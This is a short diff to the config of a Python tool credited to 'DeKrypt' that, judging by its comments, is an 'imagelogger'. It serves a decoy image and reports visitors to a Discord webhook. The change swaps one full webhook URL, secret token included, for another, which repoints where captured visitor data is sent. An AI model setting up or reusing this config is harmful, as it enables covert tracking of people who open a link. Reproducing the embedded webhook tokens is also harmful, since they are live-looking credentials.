@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1448154652465172682/xtYTyaRrpwXpKfIJI4ZYmJVxIeFTeWnm2WvJ5HHwhZgxkHdSR3SzlzckSFV839VtjZND",
+    "webhook": "https://discord.com/api/webhooks/1449249247525474374/ubSYnBqbdP7va2Cjg1-DdBiMRJXur197YEZPMQlULDTdMrHOdBWt3Gw51UXlXrbMPNcB",
     "image": "https://pngimg.com/d/rick_morty_PNG28.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
